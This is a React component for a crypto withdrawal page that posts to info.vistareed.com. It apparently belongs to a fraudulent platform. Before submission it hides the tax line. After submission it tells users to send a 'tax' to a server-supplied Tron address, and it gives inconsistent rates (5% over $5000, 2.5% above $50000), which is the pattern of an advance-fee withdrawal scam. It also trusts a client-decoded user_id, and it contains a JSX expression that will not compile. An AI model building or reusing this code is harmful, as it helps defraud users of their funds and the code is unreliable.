import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './WithdrawCrypto.css';
import { jwtDecode } from 'jwt-decode';

const tokenList = [
  { id: 16, symbol: "BTC", name: "Bitcoin", price_in_usd: 95320 },
  { id: 17, symbol: "ETH", name: "Ethereum", price_in_usd: 1826.47 },
  { id: 14, symbol: "TRX", name: "Tron", price_in_usd: 0.244756 },
  { id: 15, symbol: "USDC", name: "USD Coin", price_in_usd: 0.999944 },
  { id: 18, symbol: "USDT", name: "Tether", price_in_usd: 1 },
];

const WithdrawCrypto = () => {
  const [userId, setUserId] = useState(null);
  const [tokenSymbol, setTokenSymbol] = useState('USDT');
  const [amount, setAmount] = useState('');
  const [recipientAddress, setRecipientAddress] = useState('');
  const [fee, setFee] = useState(0);
  const [tax, setTax] = useState(0);
  const [totalDeduct, setTotalDeduct] = useState(0);
  const [isTaxed, setIsTaxed] = useState(false);
  const [response, setResponse] = useState(null);
  const [error, setError] = useState('');

  useEffect(() => {
    const token = localStorage.getItem('access_token');

    if (!token) {
      console.warn('No token found. Please log in.');
      setError('Please log in.');
      return;
    }

    try {
      const decoded = jwtDecode(token);
      const isExpired = decoded.exp * 1000 < Date.now();

      if (isExpired) {
        console.warn('Token expired. Logging out...');
        localStorage.removeItem('access_token');
        setError('Session expired. Please log in again.');
        return;
      }

      const uid = decoded.sub || decoded.user_id;
      setUserId(uid);
    } catch (err) {
      console.error('Error decoding token:', err);
      setError('Invalid token. Please log in again.');
    }
  }, []);

  useEffect(() => {
    const parsedAmount = parseFloat(amount);
    if (!isNaN(parsedAmount) && parsedAmount > 0) {
      const calculatedFee = parsedAmount * 0.00005;
      const isOverThreshold = parsedAmount > 5000;
      const calculatedTax = isOverThreshold ? parsedAmount * 0.05 : 0;
      setFee(calculatedFee);
      setTax(calculatedTax);
      setIsTaxed(isOverThreshold);
      setTotalDeduct(parsedAmount + calculatedFee); // Only withdrawal fee and amount are deducted
    } else {
      setFee(0);
      setTax(0);
      setIsTaxed(false);
      setTotalDeduct(0);
    }
  }, [amount]);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!userId) {
      setError('User not authenticated.');
      return;
    }

    try {
      const payload = {
        user_id: userId,
        token_symbol: tokenSymbol,
        amount: parseFloat(amount),
        recipient_address: recipientAddress,
        taxed: isTaxed,
      };

      const res = await axios.post('https://info.vistareed.com/coins/withdraw', payload);
      setResponse(res.data);
      setError('');
    } catch (err) {
      console.error(err);
      setResponse({ error: err.response?.data?.detail || 'An error occurred' });
    }
  };

  return (
    <div className="withdraw withdraw-body">
      <div className="withdraw-container">
        <h2 className="withdraw-heading">Withdraw Token</h2>

        {error && <p className="withdraw-error">⚠️ {error}</p>}

        <form onSubmit={handleSubmit}>
          <div>
            <label className="withdraw-label">Select Token</label>
            <select
              className="withdraw-select"
              value={tokenSymbol}
              onChange={(e) => setTokenSymbol(e.target.value)}
            >
              {tokenList.map((token) => (
                <option key={token.id} value={token.symbol}>
                  {token.name} ({token.symbol})
                </option>
              ))}
            </select>
          </div>
          <div>
            <label className="withdraw-label">Amount</label>
            <input
              type="number"
              step="any"
              className="withdraw-input"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="Enter amount"
              required
            />
          </div>
          <div>
            <label className="withdraw-label">Recipient Address</label>
            <input
              type="text"
              className="withdraw-input"
              value={recipientAddress}
              onChange={(e) => setRecipientAddress(e.target.value)}
              placeholder="Enter recipient wallet address"
              required
            />
          </div>

          <div className="withdraw-info">
            <p>Withdrawal Fee  (0.005%): <strong>{fee.toFixed(8)}</strong></p>
            {isTaxed && (
              // <p>Tax (5% over $5000): <strong>{tax.toFixed(8)}</strong></p>
            )}
            <p>Total Deducted from Wallet: <strong>{totalDeduct.toFixed(8)}</strong></p>
          </div>

          <button
            type="submit"
            className="withdraw-button"
            disabled={!userId}
          >
            Withdraw
          </button>
        </form>

        {response && (
          <div className="withdraw-message">
            {response.error ? (
              <p className="withdraw-error">Error: {response.error}</p>
            ) : (
              <>
                <p className="withdraw-success font-medium">✅ Withdrawal submitted</p>
                <p><strong>From:</strong> {response.from_address}</p>
                <p><strong>To:</strong> {response.recipient_address}</p>
                <p><strong>Fee Charged:</strong> {response.fee_charged}</p>

                {response.tax_applied > 0 && (
                  <>
                    <p><strong>A 2.5% Tax is charged for Every Withdrawal above $50000</strong></p>
                    <p><strong>Tax Charged:</strong> {response.tax_applied}</p>
                    <p><strong>Status:</strong> <span style={{ color: 'orange', fontWeight: 'bold' }}>Processing</span></p>
                    <p><strong>Send Tax To:</strong> {response.tax_paid_to}</p>
                    <p><strong>Network: Tron</strong></p>
                    <p className="tax-warning">
                      <strong>⚠️ Tax Payment Required:</strong><br />
                      <span>{response.tax_payment_instruction}</span>
                    </p>
                  </>
                )}

                {response.transaction_id && (
                  <p><strong>Transaction ID:</strong> <b>{response.transaction_id}</b></p>
                )}
              </>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default WithdrawCrypto;
